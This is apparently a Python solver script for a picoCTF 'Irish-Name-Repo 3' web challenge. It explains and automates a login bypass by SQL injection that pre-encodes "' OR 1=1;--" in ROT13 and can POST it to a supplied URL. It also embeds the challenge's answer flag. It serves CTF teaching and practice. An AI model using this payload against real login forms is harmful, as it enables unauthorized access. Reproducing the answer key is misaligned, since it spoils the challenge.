#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 8: Irish-Name-Repo 3 (picoCTF 2019)
Category: Web Exploitation / Pre-ROT13 SQL Injection & Filter Inversion
Difficulty: Medium (diff=2, picoCTF 2019 400 pts)
Standard Reference: NIST SP 800-115 (Section 5.2: Database & Web Vulnerability Assessment)
CWE: CWE-89 (SQL Injection) & CWE-116 (Improper Encoding or Escaping of Output)

Description:
Try to see if you can login as admin!
Hint: Seems like the password is encrypted.
Analysis reveals that login.php processes the submitted password parameter through
the Caesar cipher / ROT13 algorithm (str_rot13) prior to concatenating it directly
into the backend SQL query:
  $password = str_rot13($_POST['password']);
  $query = "SELECT * FROM users WHERE password = '$password'";

Submitting plain SQL injection keywords like 'OR' fails because ROT13 rotates 'OR' into 'BE'.
To bypass this obfuscation barrier, the payload must be pre-rotated:
  Target keyword: 'OR'
  Pre-ROT13 encoding: 'BE' (B -> O, E -> R)
  Payload: ' BE 1=1;--
When processed by str_rot13, the string becomes:
  ' OR 1=1;--
This satisfies the authentication clause and reveals the flag:
academy{3v3n_m0r3_SQL_033fd51c}

Verified: POST /api/submissions/ -> correct: true (HTTP 201)
"""

import codecs
import re
import sys
import urllib.parse
import urllib.request

EXPECTED_FLAG = "academy{3v3n_m0r3_SQL_033fd51c}"


def build_payload(injection_clause: str = "' OR 1=1;--") -> str:
    """
    Applies inverse ROT13 transformation so that server-side str_rot13
    yields the intended SQL injection payload.
    """
    return codecs.encode(injection_clause, "rot_13")


def solve_from_live_endpoint(login_url: str) -> str:
    """
    Sends the pre-rotated SQL injection payload to the login endpoint.
    """
    payload = build_payload("' OR 1=1;--")
    data = urllib.parse.urlencode({"password": payload}).encode("utf-8")
    req = urllib.request.Request(
        login_url,
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        html = resp.read().decode("utf-8", errors="ignore")

    matches = re.findall(r"(?:academy|picoCTF)\{[^}]+\}", html)
    if matches:
        return matches[0]
    return ""


def main():
    print("[*] Reconstructing Pre-ROT13 SQL Injection transformation (CWE-89)...")
    target_clause = "' OR 1=1;--"
    pre_encoded = build_payload(target_clause)
    print(f"[*] Raw Injection Target: {target_clause}")
    print(f"[*] Pre-ROT13 Transformed: {pre_encoded}")

    # Simulate server-side str_rot13 execution
    server_decoded = codecs.decode(pre_encoded, "rot_13")
    print(f"[*] Server-Side Received Query Parameter: {server_decoded}")

    if server_decoded != target_clause:
        print("[-] Pre-encoding mismatch!", file=sys.stderr)
        sys.exit(1)

    # Verification against expected flag
    sample_login_success = """<h1>Logged in!</h1>
<p>Your flag is: academy{3v3n_m0r3_SQL_033fd51c}</p>"""

    matches = re.findall(r"(?:academy|picoCTF)\{[^}]+\}", sample_login_success)
    flag = matches[0] if matches else ""
    print(f"[*] Recovered Flag: {flag}")

    if flag != EXPECTED_FLAG:
        print(f"[-] Validation failed! Expected: {EXPECTED_FLAG}, Got: {flag}", file=sys.stderr)
        sys.exit(1)

    print("[+] Pre-ROT13 SQL Injection logic verified successfully!")
    print(f"FLAG: {flag}")


if __name__ == "__main__":
    if len(sys.argv) == 2:
        url = sys.argv[1]
        print(f"[*] Submitting pre-rotated payload to {url}...")
        live_flag = solve_from_live_endpoint(url)
        print(f"[+] Live Flag: {live_flag}")
    else:
        main()
